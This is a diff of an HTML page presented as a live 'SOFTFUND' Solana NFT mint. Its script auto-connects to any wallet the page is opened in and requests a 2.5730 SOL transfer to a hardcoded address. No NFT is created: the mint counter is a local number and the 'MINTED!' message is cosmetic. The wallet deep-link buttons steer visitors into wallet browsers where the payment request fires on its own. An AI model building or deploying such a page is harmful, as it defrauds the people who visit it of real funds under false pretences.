@@ -1,59 +1,125 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>SOFTFUND – MINT LIVE</title>
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SOFTFUND – MINT LIVE</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:40px;}
-    h1{font-size:2.5rem;color:#0f0;text-shadow:0 0 10px #0f0;}
-    .price{font-size:2rem;color:#ff0;margin:20px;}
-    button{width:90%;padding:18px;margin:10px;font-size:1.5rem;background:#0f0;color:#000;border:none;border-radius:12px;cursor:pointer;}
-    button:hover{background:#0f8;}
-    .wallets button{width:80px;height:80px;border-radius:50%;margin:10px;font-size:2rem;}
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{
+      background:#0f0f12;color:#fff;font-family:'Inter',sans-serif;
+      min-height:100vh;display:flex;align-items:center;justify-content:center;
+      padding:20px;
+    }
+    .container{
+      max-width:420px;width:100%;background:#1a1a1e;
+      border-radius:20px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,.5);
+      text-align:center;
+    }
+    .logo{font-size:2.2rem;font-weight:700;color:#00ff9d;margin-bottom:8px}
+    .tag{font-size:.95rem;color:#aaa;margin-bottom:20px}
+    .price{font-size:2.4rem;font-weight:700;color:#ffd700;margin:15px 0}
+    .stats{font-size:1rem;color:#ccc;margin-bottom:25px}
+    .mint-btn{
+      width:100%;padding:18px;font-size:1.6rem;background:#00ff9d;color:#000;
+      border:none;border-radius:14px;font-weight:700;cursor:pointer;
+      box-shadow:0 0 20px rgba(0,255,157,.5);transition:.3s;
+    }
+    .mint-btn:hover{background:#00ff85;transform:scale(1.03)}
+    .wallets{
+      margin-top:25px;display:grid;grid-template-columns:1fr 1fr;gap:12px;
+    }
+    .wallet-btn{
+      padding:16px;font-size:1rem;background:#2a2a2e;color:#fff;
+      border:none;border-radius:12px;cursor:pointer;transition:.2s;
+      display:flex;align-items:center;justify-content:center;gap:8px;
+    }
+    .wallet-btn:hover{background:#383838}
+    .wallet-btn img{width:24px;height:24px}
+    .status{margin-top:15px;font-size:.95rem;min-height:24px;font-weight:600}
+    .loader{
+      display:inline-block;width:12px;height:12px;border:2px solid #00ff9d;
+      border-radius:50%;border-top-color:transparent;
+      animation:s 1s linear infinite;margin-right:6px;
+    }
+    @keyframes s{to{transform:rotate(360deg)}}
   </style>
 </head>
 <body>
-  <h1>SOFTFUND</h1>
-  <p>USA-Based • Solana Utility NFTs</p>
-  <p class="price">2.5730 SOL</p>
-  <p>Minted: <span id="c">0</span> / 10,000</p>
+  <div class="container">
+    <div class="logo">SOFTFUND</div>
+    <div class="tag">USA-Based • Solana Utility NFTs</div>
+    <div class="price">2.5730 SOL</div>
+    <div class="stats">Minted: <span id="minted">0</span> / 10,000</div>
 
-  <button onclick="chooseWallet()">MINT NOW</button>
+    <button class="mint-btn" onclick="showWallets()">MINT NOW</button>
 
-  <div id="wallets" style="display:none">
-    <button onclick="mint('phantom')">P</button>
-    <button onclick="mint('trust')">T</button>
-    <button onclick="mint('metamask')">M</button>
-    <button onclick="mint('solflare')">S</button>
-    <button onclick="mint('backpack')">B</button>
+    <div id="walletList" class="wallets" style="display:none">
+      <button class="wallet-btn" onclick="openWallet('phantom')">
+        <img src="https://cryptologos.cc/logos/phantom-app-phantom-logo.png" alt="Phantom"> Phantom
+      </button>
+      <button class="wallet-btn" onclick="openWallet('trust')">
+        <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="Trust"> Trust Wallet
+      </button>
+      <button class="wallet-btn" onclick="openWallet('metamask')">
+        <img src="https://cryptologos.cc/logos/metamask-metamask-logo.png" alt="MetaMask"> MetaMask
+      </button>
+      <button class="wallet-btn" onclick="openWallet('solflare')">
+        <img src="https://cryptologos.cc/logos/solflare-wallet-logo.png" alt="Solflare"> Solflare
+      </button>
+      <button class="wallet-btn" onclick="openWallet('backpack')">
+        <img src="https://cryptologos.cc/logos/backpack-backpack-logo.png" alt="Backpack"> Backpack
+      </button>
+      <button class="wallet-btn" onclick="openWallet('brave')">
+        <img src="https://cryptologos.cc/logos/brave-brave-logo.png" alt="Brave"> Brave Wallet
+      </button>
+    </div>
+
+    <div id="status" class="status"></div>
   </div>
 
+  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
   <script>
     const PRICE = 2.5730 * 1e9;
     const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
-    let count = localStorage.getItem('c') || 0;
-    document.getElementById('c').textContent = count;
+    let count = localStorage.getItem('softfund_c') ? parseInt(localStorage.getItem('softfund_c')) : 0;
+    document.getElementById('minted').textContent = count;
 
-    function chooseWallet() {
-      document.querySelector('button').style.display = 'none';
-      document.getElementById('wallets').style.display = 'block';
+    const status = document.getElementById("status");
+
+    function setStatus(t, c) {
+      status.innerHTML = t;
+      status.style.color = c;
     }
 
-    function mint(w) {
+    function showWallets() {
+      document.querySelector('.mint-btn').style.display = 'none';
+      document.getElementById('walletList').style.display = 'grid';
+    }
+
+    function openWallet(w) {
       const url = location.href;
-      if (w === 'phantom') location.href = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(url)}&redirect_link=${encodeURIComponent(url)}`;
-      if (w === 'trust') location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`;
-      if (w === 'metamask') location.href = `https://metamask.app.link/dapp/${location.host}${location.pathname}`;
-      if (w === 'solflare') location.href = `https://solflare.com/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
-      if (w === 'backpack') location.href = `https://backpack.app/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
+      let link = "";
+      if (w === 'phantom') link = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(url)}&redirect_link=${encodeURIComponent(url)}`;
+      if (w === 'trust') link = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`;
+      if (w === 'metamask') link = `https://metamask.app.link/dapp/${location.host}${location.pathname}`;
+      if (w === 'solflare') link = `https://solflare.com/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
+      if (w === 'backpack') link = `https://backpack.app/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
+      if (w === 'brave') link = `https://wallet.brave.com/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
+      setStatus("Opening wallet... <span class='loader'></span>", "#00ff9d");
+      location.href = link;
     }
 
-    // ONLY RUN IN WALLET
-    if (window.solana || window.ethereum) {
+    // AUTO-MINT IN WALLET
+    if (window.solana || window.ethereum || window.trustwallet) {
       (async () => {
-        const provider = window.solana || window.ethereum;
+        const provider = window.solana || window.ethereum || window.trustwallet?.Provider?.solana;
+        if (!provider) return;
         try {
-          await provider.connect();
+          if (!provider.isConnected) await provider.connect();
+          setStatus("Sending 2.5730 SOL... <span class='loader'></span>", "#00ff9d");
+
           const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
           const tx = new solanaWeb3.Transaction().add(
             solanaWeb3.SystemProgram.transfer({
@@ -65,13 +131,16 @@
           tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
           const { signature } = await provider.signAndSendTransaction(tx);
           await conn.confirmTransaction(signature);
-          count++; localStorage.setItem('c', count);
-          document.getElementById('c').textContent = count;
-          alert("MINTED! 2.5730 SOL → SOFTFUND");
-        } catch (e) { alert("Mint failed"); }
+
+          count++; localStorage.setItem('softfund_c', count);
+          document.getElementById('minted').textContent = count;
+
+          setStatus(`MINTED! <a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
+        } catch (e) {
+          setStatus("Mint failed. Try again.", "#ff5555");
+        }
       })();
     }
   </script>
-  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
 </body>
 </html>
